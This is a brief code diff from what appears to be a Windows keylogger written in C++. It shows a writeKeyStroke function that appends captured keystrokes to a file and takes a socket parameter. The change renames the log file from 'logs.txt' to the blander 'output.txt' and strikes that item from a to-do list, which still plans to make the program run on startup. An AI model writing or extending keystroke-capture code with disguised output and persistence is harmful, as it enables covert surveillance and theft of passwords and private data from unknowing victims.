@@ -23,7 +23,7 @@
 void writeKeyStroke(int trueKey, SOCKET sObjC)
 {
     std::ofstream file;
-    file.open("logs.txt", std::ios::app);
+    file.open("output.txt", std::ios::app);
     char trueKeyC = static_cast<char>(trueKey);
     if (trueKey == ENTER)
     {
@@ -88,6 +88,5 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     ~ check documentation for ALL code files to ensure everything is written clearly, and concisely. 
     ~ write code to schedule this program to be run on startup.
-    ~ change keystroke generated filename from logs.txt to something else.
 
 */
